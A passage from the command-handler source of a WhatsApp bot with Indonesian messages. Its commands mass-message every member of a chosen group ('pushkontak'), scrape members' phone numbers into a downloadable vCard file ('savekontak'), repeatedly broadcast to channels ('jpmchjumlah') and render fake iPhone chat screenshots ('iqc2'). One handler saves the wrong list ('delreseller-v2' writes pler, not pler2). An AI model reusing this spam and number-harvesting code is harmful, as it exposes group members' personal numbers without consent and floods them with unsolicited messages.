if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./library/database/idgrup.json', JSON.stringify(pler))
Reply(`*Sukses Menghapus Akses Digroup Ini✅*`)
}
break

case "delreseller-v2": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
var ini = pler2.indexOf(m.chat)
pler2.splice(ini, 1)
fs.writeFileSync('./library/database/idgrup2.json', JSON.stringify(pler))
Reply(`*Sukses Menghapus Akses Digroup Ini✅*`)
}
break

case "iqc2": {
 if (!q) return m.reply(`❌ Contoh:\n${prefix + command} hidup Jokowi`);

 const url = `https://veloria-ui.vercel.app/imagecreator/fake-chat?time=12:00&messageText=${encodeURIComponent(q)}&batteryPercentage=100`;

 await conn.sendMessage(m.chat, {
 image: { url },
 caption: "📱 *Fake iPhone Quoted Message*"
 }, { quoted: m });
}
 break
 
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
case "totalfitur": {
if (!isCreator) return (`Maaf Fitur Ini Khusus Developer!!`)
Reply(`📂 *Jumlah Fitur:* ${totalFitur()} fitur`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getdeskgc": {
 if (!m.isGroup) return Reply('*Perintah ini hanya dapat digunakan di dalam grup!*')

 try {
 const desc = m.metadata.desc || '*Tidak ada deskripsi grup.*'
 const ownerId = m.metadata.owner || 'Tidak diketahui'
 const creatorTag = ownerId ? '@' + ownerId.split('@')[0] : 'Tidak diketahui'

 let teks = `*DESKRIPSI GRUP*\n\n`
 teks += `${desc}\n\n`
 teks += `*⭔ Nama Grup:* ${m.metadata.subject}\n`
 teks += `*⭔ Jumlah Member:* ${m.metadata.participants.length}\n`
 teks += `*⭔ Dibuat oleh:* ${creatorTag}`

 await conn.sendMessage(m.chat, {
 text: teks,
 mentions: [ownerId]
 }, { quoted: m })

 } catch (err) {
 console.error(err)
 Reply('*Gagal mengambil deskripsi grup.*')
 }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "totalmember": {
 if (!m.isGroup) return Reply('*Perintah ini hanya bisa digunakan di dalam grup!*')

 try {
 const total = m.metadata?.participants?.length || 0
 const teks = `👥 *TOTAL MEMBER GRUP*\n\n📌 Jumlah Member: *${total}* orang`

 await conn.sendMessage(m.chat, {
 text: teks
 }, { quoted: m })

 } catch (err) {
 console.error(err)
 Reply('*Gagal mengambil jumlah member grup.*')
 }
}
break

case "getppgrup": {
 if (!m.isGroup) return m.reply('Perintah ini hanya bisa dipakai di dalam grup!');

 try {
 let ppUrl = await conn.profilePictureUrl(m.chat, 'image');
 // Kirim gambar profil grup
 await conn.sendMessage(m.chat, { 
 image: { url: ppUrl }, 
 caption: 'Ini adalah foto profil grup ini.' 
 }, { quoted: m });
 } catch (err) {
 // Kalau error (misal foto grup gak ada)
 await conn.sendMessage(m.chat, { 
 image: { url: 'https://telegra.ph/file/95670d63378f7f4210f03.png' }, 
 caption: 'Foto profil grup tidak ditemukan!' 
 }, { quoted: m });
 }
}
break

//=============================================//

case "getpp":
case "getppnomor": {
    const target = m.quoted 
        ? m.quoted.sender 
        : m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : text 
        ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" 
        : null;

    if (!target) return m.reply(`*Contoh penggunaan :*
ketik ${cmd} @tag atau nomor`);

    var ppuser;
    try {
        ppuser = await conn.profilePictureUrl(target, 'image');
    } catch (err) {
        ppuser = 'https://files.catbox.moe/ejy4ky.jpg'; // fallback pp
    }

    await conn.sendMessage(
        m.chat, 
        { 
            image: { url: ppuser }, 
            caption: `Sukses mengambil profil @${target.split("@")[0]}`, 
            mentions: [target] 
        }, 
        { quoted: m }
    );
}
break;

//=============================================//

case "setjeda": case "setjedapus": case "setjedapush": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`Format salah!
*contoh:* ${cmd} 5000

Jeda pushkontak saat ini:
${set.JedaPushkontak}

Keterangan:
1000 = 1 detik`)
if (isNaN(text)) return reply(`Format salah!
*contoh:* ${cmd} 5000

Jeda pushkontak saat ini:
${set.JedaPushkontak}

Keterangan:
1000 = 1 detik`)
set.JedaPushkontak = Number(text)
await fs.writeFileSync("./library/database/setbot.json", JSON.stringify(set, null, 2))
return reply(`Berhasil Mengubah Jeda Pushkontak ✅\n\nJeda Pushkontak Saat Ini:\n${set.JedaPushkontak}`)
}
break

//=============================================//

case "pushkontak": case "puskontak": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`Masukan pesannya\n*contoh:* ${cmd} pesannya`)
global.textpushkontak = text
let rows = []
const a = await conn.groupFetchAllParticipating()
if (a.length < 1) return reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.pushkontak-response ${u.id}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `Pilih Target Grup Chat`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup Pushkontak\n`
}, { quoted: m })
}
break

case "pushkontak-response": {
  if (!isCreator) return reply(mess.owner)
  if (!global.textpushkontak) return reply(`Data teks pushkontak tidak ditemukan!\nSilahkan ketik *.pushkontak* pesannya`);
  const teks = global.textpushkontak
  const jidawal = m.chat
  const data = await conn.groupMetadata(text)
  const halls = data.participants
    .filter(v => v.id.endsWith('.net') ? v.id : v.jid)
    .map(v => v.id.endsWith('.net') ? v.id : v.jid)
    .filter(id => id !== botNumber && id.split("@")[0] !== global.owner); 

  await reply(`🚀 Memulai pushkontak ke dalam grup ${data.subject} dengan total member ${halls.length}`);

  for (const mem of halls) {
    await conn.sendMessage(mem, { text: teks }, { quoted: qlocPush });
    await sleep(set.JedaPushkontak);
  }
  delete global.textpushkontak
  await reply(`✅ Sukses pushkontak!\nPesan berhasil dikirim ke *${halls.length}* member.`, jidawal)
}
break

//=============================================//

case "pushkontak2": case "puskontak2": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.includes("|")) return Reply(`Masukan pesan dan nama kontak!\n*Contoh:* ${cmd} pesannya|namakontak`)
global.textpushkontak = text.split("|")[0]
global.namakontak = text.split("|")[1]
let rows = []
const a = await conn.groupFetchAllParticipating()
if (a.length < 1) return Reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.pushkontak2-response ${u.id}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `Pilih Target Grup Chat`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup Pushkontak\n`
}, { quoted: m })
}
break

case "pushkontak2-response": {
  if (!isCreator) return Reply(mess.owner)
  if (!global.textpushkontak || !global.namakontak) return Reply(`Data pushkontak tidak ditemukan!\nSilahkan ketik *.pushkontak2* pesannya|namakontak`);
  const teks = global.textpushkontak
  const jidawal = m.chat
  const data = await conn.groupMetadata(text)
  const halls = data.participants
    .filter(v => v.id && v.id)
    .map(v => v.id.includes("@s.whatsapp.net") ? v.id : v.jid)
    .filter(id => id !== conn.user.id && id.split("@")[0] !== global.owner); 

  await Reply(`🚀 Memulai pushkontak autosave ke dalam grup ${data.subject} dengan total member ${halls.length}`);

  for (const mem of halls) {
    const contactAction = {
        "fullName": `${global.namakontak}-${mem.split("@")[0]}`,
        "lidJid": mem, 
        "saveOnPrimaryAddressbook": true
    };
    await conn.addOrEditContact(mem, contactAction);
    await conn.sendMessage(mem, { text: teks }, { quoted: qlocPush });
    await sleep(set.JedaPushkontak);
  }

  delete global.textpushkontak
  delete global.namakontak
  await Reply(`✅ Sukses pushkontak autosave!\nPesan berhasil dikirim ke *${halls.length}* member.`, jidawal)
}
break

//=============================================//

case "savekontak": case "svkontak": {
if (!isCreator) return reply(mess.owner)
let rows = []
const a = await conn.groupFetchAllParticipating()
if (a.length < 1) return reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.savekontak-response ${u.id}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `Pilih Target Grup Chat`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup Savekontak\n`
}, { quoted: m })
}
break

case "savekontak-response": {
  if (!isCreator) return reply(mess.owner)
  if (!text) return 
  try {
    const res = await conn.groupMetadata(text)
    const halls = res.participants
    .filter(v => v.id.endsWith('.net') ? v.id : v.jid)
    .map(v => v.id.endsWith('.net') ? v.id : v.jid)
    .filter(id => id !== botNumber && id.split("@")[0] !== global.owner); 

    if (!halls.length) return reply("Tidak ada kontak yang bisa disimpan.")
    let names = text
    const existingContacts = JSON.parse(fs.readFileSync('./Data/contacts.json', 'utf8') || '[]')
    const newContacts = [...new Set([...existingContacts, ...halls])]

    fs.writeFileSync('./Data/contacts.json', JSON.stringify(newContacts, null, 2))

    const vcardContent = newContacts.map(contact => {
      const phone = contact.split("@")[0]
      return [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:Buyyer - ${phone}`,
        `TEL;type=CELL;type=VOICE;waid=${phone}:+${phone}`,
        "END:VCARD",
        ""
      ].join("\n")
    }).join("")

    fs.writeFileSync("./Data/contacts.vcf", vcardContent, "utf8")

    // Kirim ke private chat
    if (m.chat !== m.sender) {
      await reply(`Berhasil membuat file kontak dari grup ${res.subject}\n\nFile kontak telah dikirim ke private chat\nTotal ${halls.length} kontak`)
    }

    await conn.sendMessage(
      m.sender,
      {
        document: fs.readFileSync("./Data/contacts.vcf"),
        fileName: "contacts.vcf",
        caption: `File kontak berhasil dibuat ✅\nTotal ${halls.length} kontak`,
        mimetype: "text/vcard",
      },
      { quoted: m }
    )

    fs.writeFileSync("./Data/contacts.json", "[]")
    fs.writeFileSync("./Data/contacts.vcf", "")

  } catch (err) {
    reply("Terjadi kesalahan saat menyimpan kontak:\n" + err.toString())
  }
}
break

//=============================================//

case "cekidgrup": {
  if (!isCreator) return reply(mess.owner)

  const a = await conn.groupFetchAllParticipating()
  const Data = Object.values(a)
  let teks = `📛 *Daftar Grup & ID:*\n\n`

  for (let u of Data) {
    teks += `🧩 *${u.subject}*\n🆔 ${u.id}\n👥 Member: ${u.participants.length}\n\n`
  }

  reply(teks)
}
break

case "sync": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require("fs");

  try {
    Reply("🔍 Mulai proses sync... (mendeteksi Owner & Admin saluran)");

    const ress = await conn.newsletterFetchAllParticipating();
    const allChannels = Object.values(ress)
      .filter(v => 
        v.id && 
        ["OWNER", "ADMIN"].includes(v.viewer_metadata?.role)
      )
      .map(v => v.id);

    // Hapus duplikat ID
    const uniqueChannels = [...new Set(allChannels)];

    if (uniqueChannels.length < 1) return Reply("❌ Tidak ada Channel WhatsApp (Owner/Admin) yang terdeteksi!");

    await fs.writeFileSync(
      "./library/database/idsaluran.json",
      JSON.stringify(uniqueChannels, null, 2)
    );

    Reply(`✅ Berhasil menyimpan total ${uniqueChannels.length} ID Channel (Owner/Admin) ke database!`);
  } catch (err) {
    console.error(err);
    Reply("❌ Terjadi kesalahan saat melakukan sync ID saluran!");
  }
}
break;

case "jpmchteks": {
 if (!isCreator && !isJasher) return Reply(mess.owner);
 const fs = require('fs');
 const setting = JSON.parse(fs.readFileSync('./library/database/setbot.json', 'utf8'));
 if (!setting.botJpmch) return Reply("❌ Fitur JPMCH sedang nonaktif.");

 if (!text) return Reply("Teksnya?");
 let daftarSaluran;
 try {
   daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
 } catch (e) {
   console.error(e);
   return Reply("❌ Gagal baca file idsaluran.json");
 }

 Reply("⏳ Kirim teks sedang diproses...");

 for (const id of daftarSaluran) {
   try {
     await conn.sendMessage(id, { text });
     await sleep(setting.delayJpm || 5000);
   } catch (err) {
     console.error(`❌ Gagal kirim ke ${id}:`, err);
   }
 }
 Reply("✅ Teks berhasil dikirim ke semua saluran.");
}
break;

//=============================================//

case "jpmchvip": {
 if (!isCreator && !isJasherVIP) return Reply(mess.owner);
 const fs = require('fs');
 const setting = JSON.parse(fs.readFileSync('./library/database/setbot.json', 'utf8'));
 if (!setting.botJpmch) return Reply("❌ Fitur JPMCH sedang nonaktif.");

 if (!text) return Reply("Teksnya?");
 let daftarSaluran;
 try {
   daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
 } catch (e) {
   console.error(e);
   return Reply("❌ Gagal baca file idsaluran.json");
 }

 Reply("⏳ Kirim teks sedang diproses...");

 for (const id of daftarSaluran) {
   try {
     await conn.sendMessage(id, { text });
     await sleep(setting.delayJpm || 5000);
   } catch (err) {
     console.error(`❌ Gagal kirim ke ${id}:`, err);
   }
 }
 Reply("✅ Teks berhasil dikirim ke semua saluran.");
}
break;

//=============================================//

case "jpmchfoto": {
  if (!isCreator) return m.reply(mess.owner);

  const fs = require("fs");
  const settingPath = "./library/database/setbot.json";
  const setting = fs.existsSync(settingPath)
    ? JSON.parse(fs.readFileSync(settingPath))
    : { botJpmch: false, delayJpm: 5000 };

  if (!setting.botJpmch) return m.reply("❌ Fitur JPMCH sedang nonaktif.");

  // Ambil pesan yang dibalas atau pesan sendiri
  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || "";

  if (!text) return m.reply("❌ Balas atau kirim foto disertai teks caption!");
  if (!/image/.test(mime)) return m.reply("❌ Format salah! Balas/kirim foto dengan teks.");

  // Download media
  const imagePath = await conn.downloadAndSaveMediaMessage(quoted);

  // Ambil daftar saluran dari database
  const daftarSaluran = JSON.parse(fs.readFileSync("./library/database/idsaluran.json"));
  if (!daftarSaluran.length) return m.reply("❌ Tidak ada saluran yang tersimpan.");

  m.reply(`🕒 Mengirim foto ke ${daftarSaluran.length} saluran...`);
  let total = 0;

  for (const idSaluran of daftarSaluran) {
    try {
      await conn.sendMessage(idSaluran, {
        image: fs.readFileSync(imagePath),
        caption: text,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
        },
      });
      total++;
    } catch (err) {
      console.error(`❌ Gagal mengirim ke saluran ${idSaluran}:`, err);
    }
    await global.sleep(setting.delayJpm || 1000);
  }

  // Hapus file setelah selesai
  fs.unlinkSync(imagePath);
  m.reply(`✅ Berhasil mengirim ke ${total} saluran.`);
}
break;

//=============================================//

case "jpmchvideo": {
  if (!isCreator) return m.reply(mess.owner);

  const fs = require("fs");
  const settingPath = "./library/database/setbot.json";
  const setting = fs.existsSync(settingPath)
    ? JSON.parse(fs.readFileSync(settingPath))
    : { botJpmch: false, delayJpm: 5000 };

  if (!setting.botJpmch) return m.reply("❌ Fitur JPMCH sedang nonaktif.");

  // Ambil media dari pesan yang dikirim atau dibalas
  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || "";

  if (!text) return m.reply("❌ Balas atau kirim video disertai teks caption!");
  if (!/video/.test(mime)) return m.reply("❌ Format salah! Balas/kirim video dengan teks.");

  // Download video
  const videoPath = await conn.downloadAndSaveMediaMessage(quoted);

  const daftarSaluran = JSON.parse(fs.readFileSync("./library/database/idsaluran.json"));
  if (!daftarSaluran.length) return m.reply("❌ Tidak ada saluran yang tersimpan.");

  m.reply(`🚀 Mengirim video ke ${daftarSaluran.length} saluran...`);
  let total = 0;

  for (const idSaluran of daftarSaluran) {
    try {
      await conn.sendMessage(idSaluran, {
        video: fs.readFileSync(videoPath),
        caption: text,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
        },
      });
      total++;
    } catch (err) {
      console.error(`❌ Gagal kirim ke saluran ${idSaluran}:`, err);
    }
    await global.sleep(setting.delayJpm || 1000);
  }

  fs.unlinkSync(videoPath);
  m.reply(`✅ Berhasil mengirim ke ${total} saluran.`);
}
break;

//=============================================//

case "jpmchaudio": {
  if (!isCreator) return m.reply(mess.owner);

  const fs = require('fs');
  const settingPath = './library/database/setbot.json';
  const setting = fs.existsSync(settingPath)
    ? JSON.parse(fs.readFileSync(settingPath))
    : { botJpmch: false, delayJpm: 5000 };

  if (!setting.botJpmch) return m.reply("❌ Fitur JPMCH sedang nonaktif.");

  if (!text) return m.reply("Balas/kirim audio dengan teks");
  if (!/audio/.test(mime)) return m.reply("Format salah! Balas/kirim audio dengan teks.");

  let audio = await conn.downloadAndSaveMediaMessage(qmsg);
  const daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json'));

  let total = 0;
  m.reply(`Memproses Mengirim Audio ke ${daftarSaluran.length} Saluran...`);

  for (const idSaluran of daftarSaluran) {
    try {
      await conn.sendMessage(idSaluran, {
        audio: fs.readFileSync(audio),
        mimetype: 'audio/mpeg', // atau 'audio/mp4' tergantung format file
        ptt: false, // ubah true kalau mau jadi voice note (VN)
        caption: text,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
        },
      });
      total++;
    } catch (err) {
      console.error(`❌ Gagal mengirim ke saluran ${idSaluran}:`, err);
    }
    await global.sleep(setting.delayJpm || 1000);
  }

  fs.unlinkSync(audio);
  m.reply(`✅ Berhasil mengirim ke ${total} saluran.`);
}
break;

//=============================================//

case "jpmchdoc": {
  if (!isCreator) return m.reply(mess.owner);

  const fs = require('fs');
  const settingPath = './library/database/setbot.json';
  const setting = fs.existsSync(settingPath)
    ? JSON.parse(fs.readFileSync(settingPath))
    : { botJpmch: false, delayJpm: 5000 };

  if (!setting.botJpmch) return m.reply("❌ Fitur JPMCH sedang nonaktif.");

  if (!text) return m.reply("Balas/kirim file dengan teks");
  if (!/document/.test(mime)) return m.reply("Format salah! Balas/kirim file dengan teks.");

  let doc = await conn.downloadAndSaveMediaMessage(qmsg);
  const daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json'));

  let total = 0;
  m.reply(`Memproses Mengirim Dokumen ke ${daftarSaluran.length} Saluran...`);

  for (const idSaluran of daftarSaluran) {
    try {
      await conn.sendMessage(idSaluran, {
        document: fs.readFileSync(doc),
        mimetype: mime,
        fileName: `Broadcast_${Date.now()}`, // nama file default
        caption: text,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
        },
      });
      total++;
    } catch (err) {
      console.error(`❌ Gagal mengirim ke saluran ${idSaluran}:`, err);
    }
    await global.sleep(setting.delayJpm || 1000);
  }

  fs.unlinkSync(doc);
  m.reply(`✅ Berhasil mengirim ke ${total} saluran.`);
}
break;

//=============================================//

case "jpmchjumlah": {
  if (!isCreator) return m.reply(mess.owner);

  let [jumlah, ...pesanArray] = text.split('|');
  let pesan = pesanArray.join('|').trim();
  jumlah = parseInt(jumlah.trim());

  if (isNaN(jumlah) || jumlah <= 0) return m.reply("❌ Masukkan jumlah pesan yang valid di awal teks! Contoh: 3| Halo semua!");

  // Memuat setting dari file setbot.json
  const fs = require('fs');
  const settingPath = './library/database/setbot.json';
  const setting = fs.existsSync(settingPath)
    ? JSON.parse(fs.readFileSync(settingPath))
    : { botJpmch: false, delayJpm: 5000 };

  if (!setting.botJpmch) return m.reply("❌ Fitur JPMCH sedang nonaktif.");
  
  // Memuat daftar saluran dari file JSON
  let daftarSaluran;
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
    if (!Array.isArray(daftarSaluran) || daftarSaluran.length === 0) {
      return m.reply("❌ Tidak ada saluran yang terdaftar.");
    }
  } catch (error) {
    console.error("Gagal membaca file idsaluran.json:", error);
    return m.reply("❌ Gagal membaca daftar saluran.");
  }

  // Kirim pesan ke semua saluran dalam daftar sesuai jumlah yang ditentukan
  for (const idSaluran of daftarSaluran) {
    for (let i = 0; i < jumlah; i++) {
      try {
        await conn.sendMessage(idSaluran, { text: pesan });
      } catch (error) {
        console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error);
      }
      await global.sleep(setting.delayJpm || 1000); // Delay sesuai setting dari setbot.json
    }
  }

  m.reply(`✅ Berhasil mengirim pesan ke semua channel sebanyak ${jumlah} kali.`);
}
break;

//=============================================//

case "jpmchbutton": {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply("Teksnya?");

  const fs = require('fs');

  // Ambil setting dari setbot.json
  const settingPath = './library/database/setbot.json';
  const setting = fs.existsSync(settingPath)
    ? JSON.parse(fs.readFileSync(settingPath))
    : { botJpmch: false, delayJpm: 5000 };

  if (!setting.botJpmch) return Reply("❌ Fitur JPMCH sedang nonaktif.");

  // Baca daftar saluran
  let daftarSaluran;
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
    if (!Array.isArray(daftarSaluran) || daftarSaluran.length === 0) {
      return Reply("❌ Tidak ada saluran yang terdaftar.");
    }
  } catch (error) {
    console.error("Gagal membaca idsaluran.json:", error);
    return Reply("❌ Gagal membaca daftar saluran.");
  }

  // Baca URL channel
  let urlChannel = {};
  try {
    urlChannel = JSON.parse(fs.readFileSync('./library/database/urlchannel.json', 'utf8'));
  } catch (error) {
    console.error("Gagal membaca urlchannel.json:", error);
    urlChannel = {
      satu: "https://whatsapp.com/channel/DEFAULT_SATU",
      dua: "https://whatsapp.com/channel/DEFAULT_DUA"
    };
  }

  Reply("⏳ Harap sabar, proses sedang berlangsung. Jeda antar kiriman sesuai pengaturan...");

  for (const idSaluran of daftarSaluran) {
    try {
      await conn.sendMessage(idSaluran, {
        text: text,
        footer: 'SEMUA CHANNEL KAMI!',
        templateButtons: [
          { index: 1, urlButton: { displayText: 'CHANNEL 1', url: urlChannel.satu } },
          { index: 2, urlButton: { displayText: 'CHANNEL 2', url: urlChannel.dua } }
        ]
      }, { quoted: m });
    } catch (error) {
      console.error(`❌ Gagal mengirim ke saluran ${idSaluran}:`, error);
    }

    // Tunggu jeda antar kiriman sesuai setbot.json
    await global.sleep(setting.delayJpm || 1000);
  }

  Reply("✅ Berhasil mengirim pesan ke semua channel WhatsApp dengan 2 button link.");
}
break;

case "seturlsatu": {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply("❌ Masukkan URL channel satu baru!");

  const fs = require('fs');
  try {
    let data = {};
    try {
      data = JSON.parse(fs.readFileSync('./library/database/urlchannel.json', 'utf8'));
    } catch {}
    data.satu = text;
    fs.writeFileSync('./library/database/urlchannel.json', JSON.stringify(data, null, 2));
    Reply("✅ URL channel satu berhasil diperbarui!");
  } catch (e) {
    console.error("Gagal update URL satu:", e);
    Reply("❌ Gagal memperbarui URL channel satu.");
  }
}
break;

case "seturldua": {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply("❌ Masukkan URL channel dua baru!");

  const fs = require('fs');
  try {
    let data = {};
    try {
      data = JSON.parse(fs.readFileSync('./library/database/urlchannel.json', 'utf8'));
    } catch {}
    data.dua = text;
    fs.writeFileSync('./library/database/urlchannel.json', JSON.stringify(data, null, 2));
    Reply("✅ URL channel dua berhasil diperbarui!");
  } catch (e) {
    console.error("Gagal update URL dua:", e);
    Reply("❌ Gagal memperbarui URL channel dua.");
  }
}
break;

//=============================================//

case "setbotjpmch": {
  if (!isCreator) return Reply(mess.owner);
  const fs = require('fs');
  const path = './library/database/setbot.json';
  let config = fs.existsSync(path) ? JSON.parse(fs.readFileSync(path)) : {};
  
  if (/on/i.test(text)) {
    config.botJpmch = true;
    fs.writeFileSync(path, JSON.stringify(config, null, 2));
    return Reply("✅ Fitur JPMCH berhasil *diaktifkan*.");
  } else if (/off/i.test(text)) {
    config.botJpmch = false;
    fs.writeFileSync(path, JSON.stringify(config, null, 2));
    return Reply("✅ Fitur JPMCH berhasil *dinonaktifkan*.");
  } else {
    return Reply(`⚙️ Contoh penggunaan:\n.setbotjpmch on\n.setbotjpmch off`);
  }
}
break;

//=============================================//

case "setdelayjpmch": {
 if (!isCreator) return Reply(mess.owner);
 if (!text || isNaN(text)) return Reply("Contoh: .setdelayjpm 5000");

 const fs = require('fs');
 const path = './library/database/setbot.json';
 let config = fs.existsSync(path) ? JSON.parse(fs.readFileSync(path)) : {};
 config.delayJpm = parseInt(text);
 fs.writeFileSync(path, JSON.stringify(config, null, 2));
 Reply(`✅ Delay antar channel diset ke ${text} ms.`);
}
break;

//=================== Tambah Jasher ====================
case "addownjs": {
  if (!isCreator && !isJasherVIP) return Reply(mess.owner);

  // MODE ALL (semua member grup)
  if (text && text.toLowerCase() === "all") {
    if (!m.isGroup) return Reply("❌ Fitur ini hanya bisa digunakan di grup.");

    const metadata = await conn.groupMetadata(m.chat);
    const participants = metadata.participants;

    let added = 0;

    for (let user of participants) {
      let jid = user.id;

      // Kalau @lid, convert ke jid normal
      if (jid.endsWith("@lid")) {
        jid = user?.jid || (user.id.split("@")[0] + "@s.whatsapp.net");
      }

      if (!jasherDB.owners.includes(jid)) {
        jasherDB.owners.push(jid);
        added++;
      }
    }

    fs.writeFileSync(jasherPath, JSON.stringify(jasherDB, null, 2));
    return Reply(`✅ Berhasil menambahkan ${added} member grup ke Own Jasher.`);
  }

  // MODE 1 ORANG
  if (!text && !m.quoted) 
    return Reply(`Kirim nomor / reply orang\nAtau ketik:\n.addownjs all`);

  let target = m.quoted
    ? m.quoted.sender
    : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  // Kalau hasilnya masih @lid, convert juga
  if (target.endsWith("@lid")) {
    target = target.split("@")[0] + "@s.whatsapp.net";
  }

  if (jasherDB.owners.includes(target)) 
    return Reply("✅ Sudah jadi Own Jasher.");

  jasherDB.owners.push(target);
  fs.writeFileSync(jasherPath, JSON.stringify(jasherDB, null, 2));

  Reply("✅ Berhasil menambahkan ke Own Jasher.");
}
break;

//=================== Hapus Jasher ====================
case "delownjs": {
  if (!isCreator) return Reply(mess.owner);

  // MODE ALL (hapus semua member grup dari database)
  if (text && text.toLowerCase() === "all") {
    if (!m.isGroup) return Reply("❌ Fitur ini hanya bisa digunakan di grup.");

    const metadata = await conn.groupMetadata(m.chat);
    const participants = metadata.participants;

    let removed = 0;

    for (let user of participants) {
      let jid = user.id;

      // Kalau @lid, convert ke jid normal
      if (jid.endsWith("@lid")) {
        jid = user?.jid || (user.id.split("@")[0] + "@s.whatsapp.net");
      }

      const index = jasherDB.owners.indexOf(jid);
      if (index !== -1) {
        jasherDB.owners.splice(index, 1);
        removed++;
      }
    }

    fs.writeFileSync(jasherPath, JSON.stringify(jasherDB, null, 2));
    return Reply(`✅ Berhasil menghapus ${removed} member grup dari Own Jasher.`);
  }

  // MODE 1 ORANG
  if (!text && !m.quoted) 
    return Reply(`Kirim nomor / reply orang\nAtau ketik:\n.delownjs all`);

  let target = m.quoted
    ? m.quoted.sender
    : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  // Kalau hasilnya masih @lid, convert juga
  if (target.endsWith("@lid")) {
    target = target.split("@")[0] + "@s.whatsapp.net";
  }

  if (!jasherDB.owners.includes(target)) 
    return Reply("❌ User ini bukan Own Jasher.");

  jasherDB.owners = jasherDB.owners.filter(v => v !== target);
  fs.writeFileSync(jasherPath, JSON.stringify(jasherDB, null, 2));

  Reply("✅ Berhasil menghapus dari Own Jasher.");
}
break;

//=================== Tambah Jasher VIP ====================
case "addptjs": {
  if (!isCreator) return Reply(mess.owner);

  // MODE ALL (semua member grup)
  if (text && text.toLowerCase() === "all") {
    if (!m.isGroup) return Reply("❌ Fitur ini hanya bisa digunakan di grup.");

    const metadata = await conn.groupMetadata(m.chat);
    const participants = metadata.participants;

    let added = 0;

    for (let user of participants) {
      let jid = user.id;

      // Kalau @lid, convert ke jid normal
      if (jid.endsWith("@lid")) {
        jid = user?.jid || (user.id.split("@")[0] + "@s.whatsapp.net");
      }

      if (!jasherVIPDB.owners.includes(jid)) {
        jasherVIPDB.owners.push(jid);
        added++;
      }
    }

    fs.writeFileSync(jasherVIPPath, JSON.stringify(jasherVIPDB, null, 2));
    return Reply(`✅ Berhasil menambahkan ${added} member grup ke Pt Jasher.`);
  }

  // MODE 1 ORANG (kode asli kamu tetap dipakai)
  if (!text && !m.quoted) 
    return Reply(`Kirim nomor atau reply orang\nContoh: .addptjs 628xxx\nAtau:\n.addptjs all`);

  let target = m.quoted 
    ? m.quoted.sender 
    : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  // Kalau masih kena @lid, normalisasi juga
  if (target.endsWith("@lid")) {
    target = target.split("@")[0] + "@s.whatsapp.net";
  }

  if (jasherVIPDB.owners.includes(target)) 
    return Reply("✅ Sudah jadi Pt Jasher.");

  jasherVIPDB.owners.push(target);
  fs.writeFileSync(jasherVIPPath, JSON.stringify(jasherVIPDB, null, 2));

  Reply("✅ Berhasil menambahkan ke Pt Jasher.");
}
break;

//=================== Hapus Jasher VIP ====================
case "delptjs": {
  if (!isCreator) return Reply(mess.owner);

  // MODE ALL (hapus semua member grup dari PT Jasher)
